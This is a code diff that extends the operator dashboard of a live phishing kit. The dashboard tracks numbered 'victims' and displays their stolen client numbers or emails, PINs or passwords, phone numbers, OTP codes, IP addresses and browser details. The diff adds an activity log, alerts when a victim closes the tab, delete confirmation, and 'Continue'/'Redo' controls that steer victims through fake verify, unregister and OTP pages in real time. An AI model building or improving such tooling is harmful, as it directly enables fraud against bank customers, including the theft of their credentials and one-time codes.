@@ -34,11 +34,26 @@
     .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)}
     .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)}
     .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
+    .icon-btn.delete{border-color:rgba(251,113,133,.3)}.icon-btn.delete:hover{background:rgba(251,113,133,.15)}
     .cred{font-family:monospace;font-size:.8rem;background:#f1f1f1;padding:2px 4px;border-radius:3px;color:#000}
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
-    #modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);align-items:center;justify-content:center;z-index:1000}#modal .card{max-width:600px;width:90%;background:#111;border-color:#333;max-height:90vh;overflow-y:auto}
+    #modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}#modal .card{max-width:700px;width:90%;background:#111;border-color:#333;max-height:90vh;overflow-y:auto;padding:28px}
     #empty{text-align:center;color:#888;padding:2rem 0}
     @media(max-width:900px){.stats{grid-template-columns:1fr}}
+
+    /* Activity Log Styles */
+    .activity-log{max-height:200px;overflow-y:auto;background:rgba(255,255,255,0.03);border-radius:8px;padding:12px;margin-top:12px}
+    .activity-item{padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;justify-content:space-between;align-items:flex-start}
+    .activity-item:last-child{border-bottom:none}
+    .activity-time{font-size:11px;color:var(--text-muted);white-space:nowrap;margin-left:12px}
+    .activity-action{font-size:12px;color:var(--text-primary);font-weight:500}
+    .activity-detail{font-size:11px;color:var(--text-muted);margin-top:2px}
+
+    /* Modal Grid Layout */
+    .modal-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    .modal-grid .full-width{grid-column:1 / -1}
+    .modal-section{background:rgba(255,255,255,0.03);border-radius:8px;padding:16px;border:1px solid rgba(255,255,255,0.05)}
+    .modal-section h4{margin:0 0 12px 0;font-size:12px;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-muted);font-weight:600}
 
     /* toast alerts */
     #alert-container{position:fixed;top:20px;right:20px;z-index:10000;display:flex;flex-direction:column;gap:10px;max-width:400px}
@@ -52,6 +67,13 @@
     .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.15);color:var(--red)}
     @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
     @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
+
+    /* Delete confirmation */
+    .delete-confirm{background:rgba(251,113,133,.1);border:1px solid rgba(251,113,133,.3);border-radius:8px;padding:16px;margin-top:16px;text-align:center}
+    .delete-confirm p{margin:0 0 12px 0;font-size:13px;color:var(--text-primary)}
+    .btn-danger{background:rgba(251,113,133,.2);border-color:rgba(251,113,133,.4);color:var(--red)}
+    .btn-danger:hover{background:rgba(251,113,133,.3)}
+    .btn-secondary{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.1)}
   </style>
 </head>
 <body>
@@ -85,12 +107,17 @@
   <!-- detail modal -->
   <div id="modal" onclick="if(event.target===this)closeModal()">
     <div class="card">
-      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
-        <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn">✕</button>
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px">
+        <h3 style="margin:0;font-size:18px">Session Details</h3>
+        <button onclick="closeModal()" class="btn" style="font-size:16px;padding:4px 12px">✕</button>
       </div>
-      <div id="modalBody" style="font-size:13px;line-height:1.6"></div>
-      <div style="margin-top:1.25rem;display:flex;gap:8px">
-        <button class="btn" onclick="act('delete',currentSid)">🗑 Delete</button>
+      
+      <div id="modalBody">
+        <!-- Content injected by JS -->
+      </div>
+      
+      <div id="modalActions" style="margin-top:20px;display:flex;gap:10px;justify-content:flex-end">
+        <!-- Actions injected by JS -->
       </div>
     </div>
   </div>
@@ -136,8 +163,12 @@
 
     /* ----------  ACTION BUTTONS (conditional)  ---------- */
     function actionButtons(s){
-      // APPROVED → no buttons
-      if (s.page==='success') return '<div style="display:flex;gap:6px"></div>';
+      // APPROVED → no buttons except view details
+      if (s.page==='success') {
+        return `<div style="display:flex;gap:6px">
+          <button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>
+        </div>`;
+      }
 
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
@@ -158,11 +189,22 @@
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       }
+      
+      // Always add delete button in actions
+      html += `<button class="icon-btn delete" onclick="confirmDelete('${s.sid}')" title="Delete Session"><img src="/images/trash-svgrepo-com.svg" style="filter:brightness(0) invert(1) sepia(1) saturate(5) hue-rotate(320deg)"></button>`;
+      
       return html + '</div>';
     }
 
     /* ----------  CHANGE DETECTION  ---------- */
     function checkChanges(newSessions){
+      // Check for removed sessions (tab closed)
+      lastSessions.forEach((old, sid) => {
+        if (!newSessions.find(s => s.sid === sid)) {
+          showAlert('error', 'SESSION CLOSED', `Victim #${old.victimNum} closed the tab`, old.victimNum);
+        }
+      });
+
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
         if (!old) {
@@ -186,6 +228,7 @@
         case 'verify.html': return 'PHONE';
         case 'unregister.html': return 'UNREGISTER';
         case 'otp.html': return 'OTP';
+        case 'success': return 'SUCCESS';
         default: return f;
       }
     }
@@ -216,26 +259,100 @@
         </tr>`).join('');
     }
 
-    /* ----------  MODAL  ---------- */
+    /* ----------  MODAL / DETAIL VIEW  ---------- */
     function showDetail(sid){
       const s = jsonData.sessions.find(x=>x.sid===sid);
       if(!s)return;
       currentSid = sid;
+      
+      // Build activity log HTML
+      const activityHtml = s.activityLog && s.activityLog.length ? 
+        s.activityLog.map(log => `
+          <div class="activity-item">
+            <div>
+              <div class="activity-action">${log.action}</div>
+              ${log.detail ? `<div class="activity-detail">${log.detail}</div>` : ''}
+            </div>
+            <div class="activity-time">${fmt(log.time)}</div>
+          </div>
+        `).join('') : '<div style="color:var(--text-muted);font-size:12px;padding:8px">No activity recorded</div>';
+      
       qs('#modalBody').innerHTML = `
-        <div class="detail">Session ID</div><div class="cred">${s.sid}</div>
-        <div class="detail">Client number</div><div class="cred">${s.email||'—'}</div>
-        <div class="detail">PIN</div><div class="cred">${s.password||'—'}</div>
-        <div class="detail">Phone</div><div class="cred">${s.phone||'—'}</div>
-        <div class="detail">OTP</div><div class="cred">${s.otp||'—'}</div>
-        <div class="detail">IP</div><div>${s.ip}</div>
-        <div class="detail">Platform</div><div>${s.platform}</div>
-        <div class="detail">Browser</div><div>${s.browser}</div>
-        <div class="detail">Current Page</div><div>${pageTitle(s.page)}</div>
-        <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
-        <div class="detail">Date</div><div>${new Date(s.dateStr).toLocaleString()}</div>`;
+        <div class="modal-grid">
+          <div class="modal-section">
+            <h4>Session Info</h4>
+            <div class="detail">Victim Number</div><div class="cred" style="font-size:16px;margin-bottom:8px">#${s.victimNum}</div>
+            <div class="detail">Session ID</div><div class="cred" style="word-break:break-all;font-size:11px">${s.sid}</div>
+            <div class="detail" style="margin-top:8px">Current Page</div><div style="font-weight:600;color:${s.page==='success'?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}</div>
+            <div class="detail" style="margin-top:8px">Connected At</div><div>${new Date(s.dateStr).toLocaleString()}</div>
+          </div>
+          
+          <div class="modal-section">
+            <h4>System Info</h4>
+            <div class="detail">IP Address</div><div class="cred">${s.ip}</div>
+            <div class="detail" style="margin-top:8px">Platform</div><div>${s.platform}</div>
+            <div class="detail" style="margin-top:8px">Browser</div><div>${s.browser}</div>
+            <div class="detail" style="margin-top:8px">User Agent</div><div style="font-size:10px;word-break:break-all;color:var(--text-muted)">${s.ua}</div>
+          </div>
+          
+          <div class="modal-section">
+            <h4>Credentials</h4>
+            <div class="detail">Client Number / Email</div><div class="cred">${s.email||'—'}</div>
+            <div class="detail" style="margin-top:8px">PIN / Password</div><div class="cred">${s.password||'—'}</div>
+          </div>
+          
+          <div class="modal-section">
+            <h4>Verification Data</h4>
+            <div class="detail">Phone Number</div><div class="cred">${s.phone||'—'}</div>
+            <div class="detail" style="margin-top:8px">OTP Code</div><div class="cred">${s.otp||'—'}</div>
+            <div class="detail" style="margin-top:8px">Unregister Clicked</div><div style="color:${s.unregisterClicked?'var(--green)':'var(--text-muted)'}">${s.unregisterClicked?'Yes':'No'}</div>
+          </div>
+          
+          <div class="modal-section full-width">
+            <h4>Activity Log</h4>
+            <div class="activity-log">${activityHtml}</div>
+          </div>
+        </div>
+      `;
+      
+      qs('#modalActions').innerHTML = `
+        <button class="btn btn-secondary" onclick="closeModal()">Close</button>
+        ${s.page !== 'success' ? `
+          <button class="btn" onclick="act('redo','${s.sid}');closeModal()" style="background:rgba(251,191,36,.15);border-color:rgba(251,191,36,.3);color:var(--yellow)">↻ Redo</button>
+          <button class="btn" onclick="act('cont','${s.sid}');closeModal()" style="background:rgba(52,211,153,.15);border-color:rgba(52,211,153,.3);color:var(--green)">→ Continue</button>
+        ` : ''}
+        <button class="btn btn-danger" onclick="showDeleteConfirm('${s.sid}')">🗑 Delete</button>
+      `;
+      
       qs('#modal').style.display='flex';
     }
-    function closeModal(){qs('#modal').style.display='none';}
+    
+    function showDeleteConfirm(sid){
+      const s = jsonData.sessions.find(x=>x.sid===sid);
+      qs('#modalBody').innerHTML = `
+        <div class="delete-confirm">
+          <p>Are you sure you want to delete <strong>Victim #${s.victimNum}</strong>?</p>
+          <p style="font-size:12px;color:var(--text-muted)">This will permanently remove the session from active sessions.</p>
+          <div style="display:flex;gap:10px;justify-content:center;margin-top:16px">
+            <button class="btn btn-secondary" onclick="showDetail('${sid}')">Cancel</button>
+            <button class="btn btn-danger" onclick="act('delete','${sid}');closeModal()">Yes, Delete</button>
+          </div>
+        </div>
+      `;
+      qs('#modalActions').innerHTML = '';
+    }
+    
+    function confirmDelete(sid){
+      // Quick delete from table view (no confirmation)
+      if(confirm('Delete this session?')){
+        act('delete', sid);
+      }
+    }
+    
+    function closeModal(){
+      qs('#modal').style.display='none';
+      currentSid = null;
+    }
 
     /* ----------  CONTROL  ---------- */
     async function act(action,sid){
@@ -255,6 +372,7 @@
     async function load(){
       const d = await fetch('/api/panel').then(r=>r.json());
       if(d.error)return location.replace('/panel');
+      jsonData = d; // Store for modal access
       checkChanges(d.sessions);
       render(d);
       setTimeout(load,300);
